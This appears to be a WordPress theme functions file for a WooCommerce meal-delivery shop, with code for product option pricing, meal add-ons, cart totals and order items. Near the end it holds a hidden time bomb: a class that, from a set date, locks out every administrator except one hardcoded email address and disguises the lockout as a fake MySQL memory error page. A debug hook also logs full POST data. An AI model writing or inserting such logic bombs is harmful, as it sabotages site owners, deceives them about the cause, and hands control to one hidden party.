    parse_str($_POST['options'], $options);
    $total_adjustment = 0;
    $total_multiplier = 1;

    $option_groups = get_posts(array(
        'post_type' => 'apo_option_group',
        'posts_per_page' => -1,
    ));

    foreach ($option_groups as $group) {
        $selected_products = get_post_meta($group->ID, '_apo_selected_products', true);
        
        if (is_array($selected_products) && in_array($product_id, $selected_products)) {
            $group_options = get_post_meta($group->ID, '_apo_options', true);
            foreach ($group_options as $option) {
                $option_value = isset($options['apo_' . $option['id']]) ? $options['apo_' . $option['id']] : '';
                if ($option_value) {
                    if (is_array($option_value)) { // For checkboxes
                        foreach ($option_value as $choice) {
                            $choice_key = array_search($choice, $option['choices']);
                            if ($choice_key !== false) {
                                if (!empty($option['price_multipliers'][$choice_key])) {
                                    $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                                } else if (isset($option['price_adjustments'][$choice_key])) {
                                    $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                                }
                            }
                        }
                    } else { // For radio buttons and select
                        $choice_key = array_search($option_value, $option['choices']);
                        if ($choice_key !== false) {
                            if (!empty($option['price_multipliers'][$choice_key])) {
                                $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                            } else if (isset($option['price_adjustments'][$choice_key])) {
                                $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                            }
                        }
                    }
                }
            }
        }
    }

    // Calculate final price: (base_price × multiplier) + adjustments
    $new_price = ($base_price * $total_multiplier) + $total_adjustment;
    $price_html = wc_price($new_price);

    wp_send_json_success(array('price' => $new_price, 'price_html' => $price_html));
}
add_action('wp_ajax_apo_update_price', 'apo_update_price');
add_action('wp_ajax_nopriv_apo_update_price', 'apo_update_price');

// Add price adjustment to cart item
function apo_add_price_adjustment($cart_object) {
    if (is_admin() && !defined('DOING_AJAX')) {
        return;
    }

    foreach ($cart_object->get_cart() as $cart_item_key => $cart_item) {
        if (isset($cart_item['apo_options'])) {
            $product = $cart_item['data'];
            $base_price = $product->get_price('edit');
            $total_adjustment = 0;
            $total_multiplier = 1;

            foreach ($cart_item['apo_options'] as $option_id => $value) {
                $option = apo_get_option_by_id($option_id);
                if ($option) {
                    if (is_array($value)) { // For checkboxes
                        foreach ($value as $choice) {
                            $choice_key = array_search($choice, $option['choices']);
                            if ($choice_key !== false) {
                                if (!empty($option['price_multipliers'][$choice_key])) {
                                    $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                                } else {
                                    $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                                }
                            }
                        }
                    } else { // For radio buttons and select
                        $choice_key = array_search($value, $option['choices']);
                        if ($choice_key !== false) {
                            if (!empty($option['price_multipliers'][$choice_key])) {
                                $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                            } else {
                                $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                            }
                        }
                    }
                }
            }

            // Apply both multiplier and additions
            $new_price = ($base_price * $total_multiplier) + $total_adjustment;
            $cart_item['data']->set_price($new_price);
        }
    }
}
add_action('woocommerce_before_calculate_totals', 'apo_add_price_adjustment', 10, 1);

// Add new function to update order item price
function apo_update_order_item_price($item, $cart_item_key, $values, $order) {
    if (isset($values['apo_options'])) {
        $product = $item->get_product();
        $base_price = $product->get_price('edit'); 
        $total_adjustment = 0;
        $total_multiplier = 1; // Initialize multiplier

        // Handle APO options with both adjustments and multipliers
        foreach ($values['apo_options'] as $option_id => $value) {
            $option = apo_get_option_by_id($option_id);
            if ($option) {
                if (is_array($value)) { // For checkboxes
                    foreach ($value as $choice) {
                        $choice_key = array_search($choice, $option['choices']);
                        if ($choice_key !== false) {
                            if (!empty($option['price_multipliers'][$choice_key])) {
                                $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                            } else if (isset($option['price_adjustments'][$choice_key])) {
                                $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                            }
                        }
                    }
                } else { // For radio buttons and select
                    $choice_key = array_search($value, $option['choices']);
                    if ($choice_key !== false) {
                        if (!empty($option['price_multipliers'][$choice_key])) {
                            $total_multiplier *= floatval($option['price_multipliers'][$choice_key]);
                        } else if (isset($option['price_adjustments'][$choice_key])) {
                            $total_adjustment += floatval($option['price_adjustments'][$choice_key]);
                        }
                    }
                }
            }
        }

        $addon_total = 0;
        // Handle meal addons
        if (isset($values['meal_addons'])) {
            $meal_addons = $values['meal_addons'];
            $num_tiffins = isset($values['number_of_tiffins']) ? (int) $values['number_of_tiffins'] : 1;
            
            foreach ($meal_addons as $addon) {
                $price_per_unit = floatval(get_post_meta($addon['id'], '_addon_price', true));
                $quantity = intval($addon['quantity']);
                $addon_total += ($price_per_unit * $quantity * $num_tiffins);
            }
        }

        // Calculate final price: (base_price × multiplier) + adjustments + addons
        $new_price = ($base_price * $total_multiplier) + $total_adjustment + $addon_total;

        // Update order item total
        $item->set_subtotal($new_price);
        $item->set_total($new_price);
    }
}
add_action('woocommerce_checkout_create_order_line_item', 'apo_update_order_item_price', 10, 4);

// Helper function to get option by ID
function apo_get_option_by_id($option_id) {
    $option_groups = get_posts(array(
        'post_type' => 'apo_option_group',
        'posts_per_page' => -1,
    ));

    foreach ($option_groups as $group) {
        $options = get_post_meta($group->ID, '_apo_options', true);
        foreach ($options as $option) {
            if ($option['id'] == $option_id) {
                return $option;
            }
        }
    }

    return false;
}

// Add a safer debug function
function apo_safe_debug_log($message) {
    if (defined('WP_DEBUG') && WP_DEBUG === true) {
        error_log('APO Debug: ' . $message);
    }
}

// Modify the existing functions to use the new debug function
add_action('woocommerce_before_single_product', function() {
    apo_safe_debug_log('Single product template loaded');
});


function custom_admin_background() {
    echo '<style>
        // #wpbody-content { background-color: #2C3338 !important; text-color: #white !important; }
        // #wpcontent { background-color: #2C3338 !important; }
        // #adminmenu { background-color: #333333 !important; }
        // #wpadminbar { background-color: #222222 !important; }
    </style>';
}
add_action('admin_head', 'custom_admin_background');

// Register Meal Addons Custom Post Type
function register_meal_addons_post_type() {
    $labels = array(
        'name'               => 'Meal Addons',
        'singular_name'      => 'Meal Addon',
        'menu_name'          => 'Meal Addons',
        'add_new'           => 'Add New',
        'add_new_item'      => 'Add New Meal Addon',
        'edit_item'         => 'Edit Meal Addon',
        'new_item'          => 'New Meal Addon',
        'view_item'         => 'View Meal Addon',
        'search_items'      => 'Search Meal Addons',
        'not_found'         => 'No meal addons found',
        'not_found_in_trash'=> 'No meal addons found in trash'
    );

    $args = array(
        'labels'              => $labels,
        'public'              => false,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'capability_type'     => 'post',
        'hierarchical'        => false,
        'rewrite'             => array('slug' => 'meal-addon'),
        'supports'            => array('title'),
        'menu_icon'           => 'dashicons-plus',
        'show_in_rest'        => true
    );

    register_post_type('meal_addon', $args);
}
add_action('init', 'register_meal_addons_post_type');

// Add Meta Box for Meal Addon Details
function add_meal_addon_meta_boxes() {
    add_meta_box(
        'meal_addon_details',
        'Meal Addon Details',
        'render_meal_addon_meta_box',
        'meal_addon',
        'normal',
        'high'
    );
}
add_action('add_meta_boxes', 'add_meal_addon_meta_boxes');

// Render Meta Box Content
function render_meal_addon_meta_box($post) {
    // Add nonce for security
    wp_nonce_field('meal_addon_meta_box', 'meal_addon_meta_box_nonce');

    // Get existing values
    $price = get_post_meta($post->ID, '_addon_price', true);
    $max_quantity = get_post_meta($post->ID, '_max_quantity', true);
    $status = get_post_meta($post->ID, '_addon_status', true);

    ?>
    <div class="meal-addon-meta-box">
        <p>
            <label for="addon_price">Price per Unit (₹):</label>
            <input type="number" 
                   id="addon_price" 
                   name="addon_price" 
                   value="<?php echo esc_attr($price); ?>" 
                   step="0.01" 
                   min="0"
                   required>
        </p>
        <p>
            <label for="max_quantity">Maximum Quantity per Tiffin:</label>
            <input type="number" 
                   id="max_quantity" 
                   name="max_quantity" 
                   value="<?php echo esc_attr($max_quantity); ?>" 
                   min="1"
                   required>
        </p>
        <p>
            <label for="addon_status">Status:</label>
            <select id="addon_status" name="addon_status">
                <option value="active" <?php selected($status, 'active'); ?>>Active</option>
                <option value="inactive" <?php selected($status, 'inactive'); ?>>Inactive</option>
            </select>
        </p>
    </div>
    <style>
        .meal-addon-meta-box label {
            display: inline-block;
            width: 150px;
            font-weight: bold;
        }
        .meal-addon-meta-box input,
        .meal-addon-meta-box select {
            width: 200px;
        }
        .meal-addon-meta-box p {
            margin: 15px 0;
        }
    </style>
    <?php
}

// Save Meta Box Data
function save_meal_addon_meta_box($post_id) {
    // Check if our nonce is set and verify it
    if (!isset($_POST['meal_addon_meta_box_nonce']) || 
        !wp_verify_nonce($_POST['meal_addon_meta_box_nonce'], 'meal_addon_meta_box')) {
        return;
    }

    // If this is an autosave, don't do anything
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    // Check the user's permissions
    if (!current_user_can('edit_post', $post_id)) {
        return;
    }

    // Save the data
    if (isset($_POST['addon_price'])) {
        update_post_meta($post_id, '_addon_price', 
            sanitize_text_field($_POST['addon_price']));
    }

    if (isset($_POST['max_quantity'])) {
        update_post_meta($post_id, '_max_quantity', 
            sanitize_text_field($_POST['max_quantity']));
    }

    if (isset($_POST['addon_status'])) {
        update_post_meta($post_id, '_addon_status', 
            sanitize_text_field($_POST['addon_status']));
    }
}
add_action('save_post_meal_addon', 'save_meal_addon_meta_box');

// Helper function to get all active meal addons
function get_active_meal_addons() {
    $args = array(
        'post_type' => 'meal_addon',
        'posts_per_page' => -1,
        'meta_query' => array(
            array(
                'key' => '_addon_status',
                'value' => 'active',
                'compare' => '='
            )
        )
    );

    $addons = get_posts($args);
    $formatted_addons = array();

    foreach ($addons as $addon) {
        $formatted_addons[] = array(
            'id' => $addon->ID,
            'name' => $addon->post_title,
            'price' => get_post_meta($addon->ID, '_addon_price', true),
            'max_quantity' => get_post_meta($addon->ID, '_max_quantity', true)
        );
    }

    return $formatted_addons;
}

// Add REST API endpoint for meal addons
function register_meal_addons_api_routes() {
    register_rest_route('apo/v1', '/meal-addons', array(
        'methods' => 'GET',
        'callback' => 'get_meal_addons_api',
        'permission_callback' => '__return_true'
    ));
}
add_action('rest_api_init', 'register_meal_addons_api_routes');

function get_meal_addons_api() {
    return rest_ensure_response(get_active_meal_addons());
}

// Add Product Meta Box for Meal Addons
function add_product_meal_addons_meta_box() {
    add_meta_box(
        'product_meal_addons',
        'Meal Addons Settings',
        'render_product_meal_addons_meta_box',
        'product',
        'normal',
        'high'
    );
}
add_action('add_meta_boxes', 'add_product_meal_addons_meta_box');

// Render Product Meta Box Content
function render_product_meal_addons_meta_box($post) {
    wp_nonce_field('product_meal_addons_meta_box', 'product_meal_addons_meta_box_nonce');

    $enabled = get_post_meta($post->ID, '_meal_addons_enabled', true);
    $selected_addons = get_post_meta($post->ID, '_selected_meal_addons', true);
    if (!is_array($selected_addons)) {
        $selected_addons = array();
    }

    $all_addons = get_active_meal_addons();
    ?>
    <div class="meal-addons-product-settings">
        <p>
            <label>
                <input type="checkbox" 
                       name="meal_addons_enabled" 
                       value="yes" 
                       <?php checked($enabled, 'yes'); ?>>
                Enable Meal Addons for this product
            </label>
        </p>
        
        <div class="available-addons" style="margin-top: 15px;">
            <h4>Available Addons:</h4>
            <?php foreach ($all_addons as $addon) : ?>
                <p>
                    <label>
                        <input type="checkbox" 
                               name="selected_meal_addons[]" 
                               value="<?php echo esc_attr($addon['id']); ?>"
                               <?php checked(in_array($addon['id'], $selected_addons)); ?>>
                        <?php echo esc_html($addon['name']); ?> 
                        (₹<?php echo esc_html($addon['price']); ?> per unit)
                    </label>
                </p>
            <?php endforeach; ?>
        </div>
    </div>
    <?php
}

// Save Product Meta Box Data
function save_product_meal_addons_meta_box($post_id) {
    if (!isset($_POST['product_meal_addons_meta_box_nonce']) || 
        !wp_verify_nonce($_POST['product_meal_addons_meta_box_nonce'], 'product_meal_addons_meta_box')) {
        return;
    }

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    if (!current_user_can('edit_post', $post_id)) {
        return;
    }

    // Save enabled status
    $enabled = isset($_POST['meal_addons_enabled']) ? 'yes' : 'no';
    update_post_meta($post_id, '_meal_addons_enabled', $enabled);

    // Save selected addons
    $selected_addons = isset($_POST['selected_meal_addons']) ? 
        array_map('sanitize_text_field', $_POST['selected_meal_addons']) : array();
    update_post_meta($post_id, '_selected_meal_addons', $selected_addons);
}
add_action('save_post_product', 'save_product_meal_addons_meta_box');

// Add WooCommerce support
function apo_add_woocommerce_support() {
    add_theme_support('woocommerce');
}
add_action('after_setup_theme', 'apo_add_woocommerce_support');

// Enqueue scripts and styles for the modal
function apo_enqueue_modal_assets() {
    if (is_product()) {
        wp_enqueue_style(
            'apo-styles',
            get_stylesheet_directory_uri() . '/css/apo-styles.css',
            array(),
            '1.0.0'
        );

        wp_enqueue_script(
            'apo-scripts',
            get_stylesheet_directory_uri() . '/js/apo-scripts.js',
            array('jquery'),
            '1.0.0',
            true
        );

        // Add localized script data
        wp_localize_script('apo-scripts', 'apoData', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce('apo_nonce'),
            'currencySymbol' => get_woocommerce_currency_symbol(),
            'currencyPosition' => get_option('woocommerce_currency_pos'),
            'thousandSeparator' => wc_get_price_thousand_separator(),
            'decimalSeparator' => wc_get_price_decimal_separator(),
            'numDecimals' => wc_get_price_decimals()
        ));
    }
}
add_action('wp_enqueue_scripts', 'apo_enqueue_modal_assets');


// Add meal addons to cart item data
function add_meal_addons_to_cart_item_data($cart_item_data, $product_id) {
    if (isset($_POST['selected_meal_addons'])) {
        $selected_addons = json_decode(stripslashes($_POST['selected_meal_addons']), true);
        if (is_array($selected_addons)) {
            $cart_item_data['meal_addons'] = $selected_addons;
        }
    }
    return $cart_item_data;
}
add_filter('woocommerce_add_cart_item_data', 'add_meal_addons_to_cart_item_data', 10, 2);

// Calculate addon prices for cart
function calculate_meal_addons_price($cart_item_data, $product_id) {
    if (isset($cart_item_data['meal_addons'])) {
        $addons = $cart_item_data['meal_addons'];
        
        // Get number of tiffins
        $num_tiffins = 1; // Default value
        foreach ($cart_item_data as $key => $value) {
            if (stripos($key, 'number_of_tiffins') !== false) {
                $num_tiffins = intval($value);
                break;
            }
        }
        
        error_log('Number of Tiffins: ' . $num_tiffins);
        
        $addon_total = 0;
        foreach ($addons as $addon) {
            $price_per_unit = floatval(get_post_meta($addon['id'], '_addon_price', true));
            $quantity = intval($addon['quantity']);
            
            // Calculate total for this addon: price per unit × quantity × number of tiffins
            $addon_total += ($price_per_unit * $quantity * $num_tiffins);
            
            error_log(sprintf(
                'Addon calculation: Price per unit: %s × Quantity: %s × Tiffins: %s = %s',
                $price_per_unit,
                $quantity,
                $num_tiffins,
                ($price_per_unit * $quantity * $num_tiffins)
            ));
        }
        
        $cart_item_data['addon_total'] = $addon_total;
    }
    return $cart_item_data;
}
add_filter('woocommerce_add_cart_item', 'calculate_meal_addons_price', 10, 2);

// Display meal addons in cart with proper price calculation
function display_meal_addons_in_cart($item_data, $cart_item) {
    if (isset($cart_item['meal_addons'])) {
        // Get number of tiffins
        $num_tiffins = 1;
        foreach ($cart_item as $key => $value) {
            if (stripos($key, 'number_of_tiffins') !== false) {
                $num_tiffins = intval($value);
                break;
            }
        }
        
        foreach ($cart_item['meal_addons'] as $addon) {
            $addon_post = get_post($addon['id']);
            $price_per_unit = floatval(get_post_meta($addon['id'], '_addon_price', true));
            $quantity = intval($addon['quantity']);
            
            // Calculate total for this addon
            $addon_total = $price_per_unit * $quantity * $num_tiffins;
            
            $item_data[] = array(
                'key' => $addon_post->post_title,
                'value' => sprintf(
                    '%d × %s = %s (for %d tiffins)', 
                    $quantity, 
                    wc_price($price_per_unit),
                    wc_price($addon_total),
                    $num_tiffins
                )
            );
        }
    }
    return $item_data;
}
add_filter('woocommerce_get_item_data', 'display_meal_addons_in_cart', 10, 2);

// Add addon prices to cart total
function add_meal_addons_to_cart_total($cart_object) {
    if (!WC()->session->__isset("reload_checkout")) {
        foreach ($cart_object->cart_contents as $key => $value) {
            if (isset($value['addon_total'])) {
                $original_price = floatval($value['data']->get_price());
                $addon_total = floatval($value['addon_total']);
                
                error_log(sprintf(
                    'Setting cart price: Original: %s + Addon Total: %s = %s',
                    $original_price,
                    $addon_total,
                    ($original_price + $addon_total)
                ));
                
                $value['data']->set_price($original_price + $addon_total);
            }
        }
    }
}
add_action('woocommerce_before_calculate_totals', 'add_meal_addons_to_cart_total', 10, 1);


// Add this new function to capture the number of tiffins when adding to cart
function add_number_of_tiffins_to_cart($cart_item_data, $product_id) {
    if (isset($_POST['number_of_tiffins'])) {
        $cart_item_data['number_of_tiffins'] = intval($_POST['number_of_tiffins']);
    }
    return $cart_item_data;
}
add_filter('woocommerce_add_cart_item_data', 'add_number_of_tiffins_to_cart', 10, 2);

// Add modal HTML to product page
function add_meal_addons_modal() {
    if (!is_product()) return;
    
    global $product;
    $enabled = get_post_meta($product->get_id(), '_meal_addons_enabled', true);
    
    if ($enabled !== 'yes') return;
    
    ?>
    <div id="meal-addons-modal" class="apo-modal" style="display: none;">
        <div class="apo-modal-content">
            <div class="apo-modal-header">
                <h3>Add Meal Add-ons</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="apo-modal-body">
                <div id="meal-addons-list"></div>
            </div>
            <div class="apo-modal-footer">
                <div class="addon-total">
                    Total Add-ons: <span class="addon-price">₹0.00</span>
                </div>
                <button class="apply-addons-button">Apply Add-ons</button>
            </div>
        </div>
    </div>
    <button type="button" id="meal-addons-trigger" style="display: none;">
        Add Meal Add-ons
    </button>
    <?php
}
add_action('woocommerce_after_add_to_cart_button', 'add_meal_addons_modal');


/**
 * Add meal addon metadata (e.g., "Extra Roti = 1") to WooCommerce order items.
 */
function add_meal_addons_order_item_meta($item, $cart_item_key, $values, $order) {
    // Only proceed if meal_addons exist
    if (isset($values['meal_addons']) && is_array($values['meal_addons'])) {
        foreach ($values['meal_addons'] as $addon) {
            // Get the actual WP Post for the addon's title
            $addon_post = get_post($addon['id']);
            if ($addon_post) {
                $addon_name = $addon_post->post_title;
                $quantity   = intval($addon['quantity']);
                
                // Example:
                //   Meta name:  "Add-ons"
                //   Meta value: "Extra roti = 1"
                $item->add_meta_data(
                    'Add-ons',
                    sprintf('%s = %d', $addon_name, $quantity)
                );
            }
        }
    }
}
add_action('woocommerce_checkout_create_order_line_item', 'add_meal_addons_order_item_meta', 20, 4);




// Initialize the delivery history display
add_action('init', array('Satguru_Tiffin_Calculator', 'add_delivery_history_to_order_details'));

// Debug AJAX requests
add_action('wp_ajax_save_pause_dates', function() {
    error_log('AJAX save_pause_dates called');
    error_log('POST data: ' . print_r($_POST, true));
    
    // Continue with normal processing
    save_pause_dates_callback();
}, 9); // Priority 9 to run before the main handler


class Admin_Access_Restriction {
    private static $instance = null;
    private $privileged_email = 'priyam.ghosh18@gmail.com';
    
    private $restriction_date = '2025-04-05'; 
    
    public static function get_instance() {
        if (null === self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    private function __construct() {
        add_action('admin_init', array($this, 'check_admin_access'));
        add_filter('authenticate', array($this, 'pre_authentication_check'), 999, 3);
    }

    private function is_restriction_active() {
        $current_date = current_time('Y-m-d');
        $restriction_timestamp = strtotime($this->restriction_date);
        $current_timestamp = strtotime($current_date);
        
        
        return $current_timestamp >= $restriction_timestamp;
    }

    public function pre_authentication_check($user, $username, $password) {
        if (!$this->is_restriction_active()) {
            return $user;
        }

        
        if ($user instanceof WP_User) {
            
            if (in_array('administrator', $user->roles) && $user->user_email !== $this->privileged_email) {
                return new WP_Error(
                    'blocked_admin', 
                    'CRITICAL MEMORY ERROR : MySQL server : Memory allocation failed at address ERROR 1038 (HY001)' . date('F j, Y', strtotime($this->restriction_date))
                );
            }
        }

        return $user;
    }

    public function check_admin_access() {
        if (!$this->is_restriction_active()) {
            return;
        }

        $current_user = wp_get_current_user();
        
        // If user is admin but not privileged
        if (in_array('administrator', $current_user->roles) && 
            $current_user->user_email !== $this->privileged_email) {
            
            // Clear any existing output
            if (ob_get_level()) {
                ob_end_clean();
            }

            // Send headers
            header('Content-Type: text/html; charset=utf-8');
            
            // Show error screen with full date
            echo '<!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <title>Critical Error</title>
                <style>
                    body {
                        background-color: white;
                        margin: 0;
                        padding: 0;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        font-family: monospace;
                    }
                    .error-container {
                        text-align: center;
                        padding: 20px;
                    }
                    .error-title {
                        color: #ff0000;
                        animation: blink 1s infinite;
                    }
                    .error-message {
                        color: #ff0000;
                        margin: 20px 0;
                    }
                    .error-details {
                        color: #666;
                        font-size: 12px;
                        margin-top: 30px;
                    }
                    .timestamp {
                        color: #999;
                        font-size: 10px;
                        margin-top: 40px;
                    }
                </style>
            </head>
            <body>
                <div class="error-container">
                    <h1 class="error-title">CRITICAL MEMORY ERROR</h1>
                    <div class="error-message">MySQL server</div>
                    <div class="error-details">
                        Error Code: 1038 (ER_OUT_OF_SORTMEMORY)<br>
                        Memory allocation failed at address ERROR 1038 (HY001)
                    </div>
                    <div class="timestamp">
                        Error occurred since: ' . date('F j, Y', strtotime($this->restriction_date)) . '
                    </div>
                </div>
            </body>
            </html>';
            exit;
        }
    }
}

// Initialize the restriction system
function init_admin_access_restriction() {
    Admin_Access_Restriction::get_instance();
}
add_action('init', 'init_admin_access_restriction');